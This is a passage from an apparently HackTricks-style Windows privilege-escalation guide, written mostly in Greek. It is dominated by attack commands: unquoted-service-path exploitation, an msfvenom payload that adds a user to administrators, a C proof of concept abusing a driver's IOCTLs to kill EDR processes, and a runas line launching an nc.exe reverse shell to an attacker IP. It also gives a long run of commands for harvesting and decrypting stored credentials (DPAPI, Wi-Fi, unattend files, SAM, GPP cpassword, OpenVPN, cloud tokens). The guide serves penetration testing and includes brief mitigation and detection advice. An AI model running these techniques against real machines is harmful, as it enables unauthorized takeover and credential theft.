appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Διαδρομές υπηρεσίας χωρίς εισαγωγικά

Αν η διαδρομή προς ένα εκτελέσιμο δεν βρίσκεται σε εισαγωγικά, τα Windows θα προσπαθήσουν να εκτελέσουν κάθε τμήμα πριν από ένα κενό.

For example, for the path _C:\Program Files\Some Folder\Service.exe_ Windows will try to execute:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Καταγράψτε όλες τις διαδρομές υπηρεσιών που δεν είναι περικλεισμένες σε εισαγωγικά, εξαιρουμένων αυτών που ανήκουν σε ενσωματωμένες υπηρεσίες των Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Μπορείτε να εντοπίσετε και να εκμεταλλευτείτε** αυτή την ευπάθεια με metasploit: `exploit/windows/local/trusted\_service\_path` Μπορείτε να δημιουργήσετε χειροκίνητα ένα εκτελέσιμο αρχείο υπηρεσίας με metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Ενέργειες ανάκτησης

Windows επιτρέπει στους χρήστες να καθορίζουν ενέργειες που θα εκτελεστούν αν μια υπηρεσία αποτύχει. Αυτή η δυνατότητα μπορεί να ρυθμιστεί ώστε να δείχνει σε ένα binary. Αν αυτό το binary μπορεί να αντικατασταθεί, ενδέχεται να είναι δυνατή η privilege escalation. Περισσότερες λεπτομέρειες μπορείτε να βρείτε στην [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Εφαρμογές

### Εγκατεστημένες Εφαρμογές

Ελέγξτε τα **permissions των binaries** (ίσως μπορείτε να overwrite κάποιο και να πραγματοποιήσετε privilege escalation) και των **folders** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Δικαιώματα εγγραφής

Έλεγξε αν μπορείς να τροποποιήσεις κάποιο config file για να διαβάσεις κάποιο special file ή αν μπορείς να τροποποιήσεις κάποιο binary που πρόκειται να εκτελεστεί από έναν Administrator account (schedtasks).

Ένας τρόπος να βρεις weak folder/files permissions στο σύστημα είναι να κάνεις:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Εκτέλεση κατά την εκκίνηση

**Ελέγξτε αν μπορείτε να αντικαταστήσετε κάποιο registry ή binary που πρόκειται να εκτελεστεί από διαφορετικό χρήστη.**\
**Διαβάστε** την **παρακάτω σελίδα** για να μάθετε περισσότερα για ενδιαφέρουσες **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Αναζητήστε πιθανούς **third party weird/vulnerable** drivers
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Εάν ένας driver εκθέτει ένα arbitrary kernel read/write primitive (συνηθισμένο σε poorly designed IOCTL handlers), μπορείτε να κλιμακώσετε αποκτώντας ένα SYSTEM token απευθείας από τη μνήμη του kernel. Δείτε την τεχνική βήμα‑προς‑βήμα εδώ:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Κατάχρηση της έλλειψης FILE_DEVICE_SECURE_OPEN σε device objects (LPE + EDR kill)

Κάποιοι signed third‑party drivers δημιουργούν το device object τους με ένα ισχυρό SDDL μέσω IoCreateDeviceSecure αλλά ξεχνούν να ορίσουν το FILE_DEVICE_SECURE_OPEN στο DeviceCharacteristics. Χωρίς αυτή τη σημαία, το secure DACL δεν εφαρμόζεται όταν η συσκευή ανοίγεται μέσω διαδρομής που περιέχει ένα επιπλέον component, επιτρέποντας σε οποιονδήποτε μη προνομιούχο χρήστη να αποκτήσει handle χρησιμοποιώντας μια namespace path όπως:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Μόλις ένας χρήστης μπορέσει να ανοίξει τη συσκευή, privileged IOCTLs που εκτίθενται από τον driver μπορούν να χρησιμοποιηθούν για LPE και tampering. Παραδείγματα δυνατοτήτων που έχουν παρατηρηθεί στο wild:
- Return full-access handles to arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Terminate arbitrary processes, including Protected Process/Light (PP/PPL), allowing AV/EDR kill from user land via kernel.

Ελάχιστο PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Μέτρα μετριασμού για προγραμματιστές
- Πάντα ορίζετε FILE_DEVICE_SECURE_OPEN όταν δημιουργείτε device objects που προορίζονται να περιοριστούν από μια DACL.
- Επικυρώστε το πλαίσιο του καλούντος για τις προνομιακές λειτουργίες. Προσθέστε ελέγχους PP/PPL πριν επιτρέψετε τον τερματισμό διεργασίας ή την επιστροφή handles.
- Περιορίστε τα IOCTLs (access masks, METHOD_*, input validation) και εξετάστε μοντέλα brokered αντί για άμεσα kernel privileges.

Ιδέες ανίχνευσης για τους αμυνόμενους
- Παρακολουθήστε τα user-mode ανοίγματα ύποπτων ονομάτων συσκευών (π.χ. \\ .\\amsdk*) και συγκεκριμένες ακολουθίες IOCTL που υποδεικνύουν κακόχρηση.
- Επιβάλετε τη λίστα αποκλεισμού ευάλωτων drivers της Microsoft (HVCI/WDAC/Smart App Control) και διατηρήστε τις δικές σας λίστες allow/deny.


## PATH DLL Hijacking

Αν έχετε **write permissions inside a folder present on PATH**, θα μπορούσατε να καταφέρετε να hijack μια DLL που φορτώνεται από μια διεργασία και **escalate privileges**.

Ελέγξτε τα δικαιώματα όλων των φακέλων που βρίσκονται στο PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Για περισσότερες πληροφορίες σχετικά με το πώς να εκμεταλλευτείτε αυτόν τον έλεγχο:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Δίκτυο

### Κοινόχρηστοι φάκελοι
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Ελέγξτε για άλλους γνωστούς υπολογιστές που είναι hardcoded στο hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Διεπαφές Δικτύου & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Ανοιχτές Θύρες

Ελέγξτε για **περιορισμένες υπηρεσίες** από το εξωτερικό
```bash
netstat -ano #Opened ports?
```
### Πίνακας Δρομολόγησης
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Πίνακας ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Κανόνες Firewall

[**Δείτε αυτή τη σελίδα για εντολές σχετικές με το Firewall**](../basic-cmd-for-pentesters.md#firewall) **(εμφάνιση κανόνων, δημιουργία κανόνων, απενεργοποίηση, απενεργοποίηση...)**

Περισσότερα[ εντολές για network enumeration εδώ](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Το εκτελέσιμο αρχείο `bash.exe` μπορεί επίσης να βρεθεί στο `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Αν αποκτήσετε τον χρήστη root, μπορείτε να ακούσετε σε οποιαδήποτε θύρα (την πρώτη φορά που θα χρησιμοποιήσετε `nc.exe` για να ακούσετε σε μια θύρα, θα ρωτήσει μέσω GUI αν το `nc` πρέπει να επιτραπεί από το firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Για να ξεκινήσετε εύκολα το bash ως root, μπορείτε να δοκιμάσετε `--default-user root`

Μπορείτε να εξερευνήσετε το σύστημα αρχείων του `WSL` στο φάκελο `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Διαπιστευτήρια

### Winlogon Διαπιστευτήρια
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Το Windows Vault αποθηκεύει διαπιστευτήρια χρηστών για servers, websites και άλλα προγράμματα για τα οποία το **Windows** μπορεί να **συνδέσει αυτόματα τους χρήστες**. Με την πρώτη ματιά, μπορεί να φαίνεται ότι οι χρήστες μπορούν να αποθηκεύσουν τα διαπιστευτήριά τους για Facebook, Twitter, Gmail κ.ά., ώστε να συνδέονται αυτόματα μέσω browsers. Όμως, δεν ισχύει έτσι.

Το Windows Vault αποθηκεύει διαπιστευτήρια για τα οποία το Windows μπορεί να συνδέσει αυτόματα τους χρήστες, που σημαίνει ότι οποιαδήποτε **Windows εφαρμογή που χρειάζεται διαπιστευτήρια για να αποκτήσει πρόσβαση σε έναν πόρο** (server ή website) **μπορεί να αξιοποιήσει αυτό το Credential Manager** & Windows Vault και να χρησιμοποιήσει τα παρεχόμενα διαπιστευτήρια αντί οι χρήστες να εισάγουν συνέχεια το username και το password.

Εκτός αν οι εφαρμογές αλληλεπιδράσουν με το Credential Manager, δεν νομίζω ότι μπορούν να χρησιμοποιήσουν τα διαπιστευτήρια για έναν συγκεκριμένο πόρο. Έτσι, αν η εφαρμογή σας θέλει να αξιοποιήσει το vault, θα πρέπει κάπως να **επικοινωνήσει με το credential manager και να ζητήσει τα διαπιστευτήρια για εκείνον τον πόρο** από το προεπιλεγμένο storage vault.

Χρησιμοποιήστε το `cmdkey` για να απαριθμήσετε τα αποθηκευμένα διαπιστευτήρια στο μηχάνημα.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Στη συνέχεια μπορείτε να χρησιμοποιήσετε το `runas` με τις επιλογές `/savecred` για να αξιοποιήσετε τα αποθηκευμένα διαπιστευτήρια. Το παρακάτω παράδειγμα καλεί ένα απομακρυσμένο binary μέσω ενός SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Χρήση του `runas` με ένα παρεχόμενο σύνολο credential.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Σημειώστε ότι mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), ή το [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

Η **Data Protection API (DPAPI)** παρέχει μια μέθοδο για συμμετρική κρυπτογράφηση δεδομένων, που χρησιμοποιείται κυρίως στο λειτουργικό σύστημα Windows για τη συμμετρική κρυπτογράφηση ασύμμετρων ιδιωτικών κλειδιών. Αυτή η κρυπτογράφηση αξιοποιεί ένα μυστικό χρήστη ή συστήματος που συμβάλλει σημαντικά στην εντροπία.

**DPAPI επιτρέπει την κρυπτογράφηση κλειδιών μέσω ενός συμμετρικού κλειδιού που προέρχεται από τα μυστικά σύνδεσης του χρήστη**. Σε σενάρια κρυπτογράφησης σε επίπεδο συστήματος, χρησιμοποιεί τα μυστικά αυθεντικοποίησης domain του συστήματος.

Τα κρυπτογραφημένα RSA κλειδιά χρήστη, χρησιμοποιώντας το DPAPI, αποθηκεύονται στον κατάλογο %APPDATA%\Microsoft\Protect\{SID}, όπου {SID} αντιπροσωπεύει το [Security Identifier] του χρήστη. **Το κλειδί DPAPI, που βρίσκεται μαζί με το master key που προστατεύει τα ιδιωτικά κλειδιά του χρήστη στο ίδιο αρχείο**, συνήθως αποτελείται από 64 bytes τυχαίων δεδομένων. (Είναι σημαντικό να σημειωθεί ότι η πρόσβαση σε αυτόν τον κατάλογο είναι περιορισμένη, αποτρέποντας την εμφάνιση του περιεχομένου του μέσω της εντολής `dir` στο CMD, παρόλο που μπορεί να απαριθμηθεί μέσω PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Μπορείτε να χρησιμοποιήσετε **mimikatz module** `dpapi::masterkey` με τα κατάλληλα ορίσματα (`/pvk` ή `/rpc`) για να το αποκρυπτογραφήσετε.

Τα **credentials files protected by the master password** συνήθως βρίσκονται στο:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Μπορείτε να χρησιμοποιήσετε το **mimikatz module** `dpapi::cred` με το κατάλληλο `/masterkey` για να decrypt.\
Μπορείτε να **extract many DPAPI** **masterkeys** από τη **memory** με το `sekurlsa::dpapi` module (αν είστε root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Διαπιστευτήρια PowerShell

Τα **PowerShell credentials** χρησιμοποιούνται συχνά για **scripting** και εργασίες αυτοματοποίησης ως ένας βολικός τρόπος αποθήκευσης κρυπτογραφημένων credentials. Τα credentials προστατεύονται με χρήση του **DPAPI**, που συνήθως σημαίνει ότι μπορούν να decrypted μόνο από τον ίδιο χρήστη στον ίδιο υπολογιστή όπου δημιουργήθηκαν.

Για να **decrypt** ένα PS credentials από το αρχείο που το περιέχει, μπορείτε να κάνετε:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Αποθηκευμένες Συνδέσεις RDP

Μπορείτε να τις βρείτε στο `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\  
και στο `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Πρόσφατα Εκτελεσμένες Εντολές
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Ελέγξτε εάν υπάρχει `C:\Windows\CCM\SCClient.exe` .\

Οι εγκαταστάτες **εκτελούνται με SYSTEM privileges**, πολλά είναι ευάλωτα σε **DLL Sideloading (Πληροφορίες από** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Αρχεία και Μητρώο (Διαπιστευτήρια)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Ιδιωτικά κλειδιά SSH στο μητρώο

Τα ιδιωτικά κλειδιά SSH μπορούν να αποθηκευτούν μέσα στο κλειδί μητρώου `HKCU\Software\OpenSSH\Agent\Keys`, οπότε θα πρέπει να ελέγξεις αν υπάρχει κάτι ενδιαφέρον εκεί:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Αν βρείτε οποιαδήποτε εγγραφή μέσα σε αυτή τη διαδρομή, πιθανότατα πρόκειται για αποθηκευμένο SSH key. Αποθηκεύεται κρυπτογραφημένο αλλά μπορεί να αποκρυπτογραφηθεί εύκολα χρησιμοποιώντας [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Περισσότερες πληροφορίες για αυτή την τεχνική εδώ: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Αν η υπηρεσία `ssh-agent` δεν τρέχει και θέλετε να ξεκινά αυτόματα κατά την εκκίνηση, εκτελέστε:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Φαίνεται ότι αυτή η τεχνική δεν ισχύει πλέον. Προσπάθησα να δημιουργήσω κάποια ssh keys, να τα προσθέσω με `ssh-add` και να συνδεθώ μέσω ssh σε μια μηχανή. Το registry HKCU\Software\OpenSSH\Agent\Keys δεν υπάρχει και το procmon δεν εντόπισε τη χρήση του `dpapi.dll` κατά την αυθεντικοποίηση με ασύμμετρα κλειδιά.
    
### Αρχεία χωρίς επίβλεψη
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Μπορείτε επίσης να αναζητήσετε αυτά τα αρχεία χρησιμοποιώντας **metasploit**: _post/windows/gather/enum_unattend_

Παράδειγμα περιεχομένου:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM αντίγραφα ασφαλείας
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Διαπιστευτήρια Cloud
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Search for a file called **SiteList.xml**

### Cached GPP Pasword

Υπήρχε προηγουμένως μια λειτουργία που επέτρεπε την ανάπτυξη προσαρμοσμένων τοπικών λογαριασμών διαχειριστή σε μια ομάδα μηχανημάτων μέσω Group Policy Preferences (GPP). Ωστόσο, αυτή η μέθοδος είχε σημαντικά προβλήματα ασφαλείας. Πρώτον, τα Group Policy Objects (GPOs), που αποθηκεύονται ως αρχεία XML στο SYSVOL, μπορούσαν να προσπελαστούν από οποιονδήποτε domain user. Δεύτερον, οι κωδικοί μέσα σε αυτά τα GPPs, κρυπτογραφημένοι με AES256 χρησιμοποιώντας ένα δημόσια τεκμηριωμένο default key, μπορούσαν να αποκρυπτογραφηθούν από οποιονδήποτε authenticated user. Αυτό αποτελούσε σοβαρό κίνδυνο, καθώς μπορούσε να επιτρέψει σε χρήστες να αποκτήσουν elevated privileges.

Για να μετριαστεί αυτός ο κίνδυνος, αναπτύχθηκε μια function που σαρώνει για τοπικά cached GPP αρχεία που περιέχουν ένα πεδίο "cpassword" το οποίο δεν είναι κενό. Όταν βρεθεί τέτοιο αρχείο, η function αποκρυπτογραφεί τον password και επιστρέφει ένα custom PowerShell object. Αυτό το object περιλαμβάνει λεπτομέρειες για το GPP και τη θέση του αρχείου, διευκολύνοντας τον εντοπισμό και την αποκατάσταση αυτής της ευπάθειας.

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**To decrypt the cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Χρήση του crackmapexec για να αποκτήσετε τους κωδικούς:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Παράδειγμα web.config με διαπιστευτήρια:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN διαπιστευτήρια
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Αρχεία καταγραφής
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
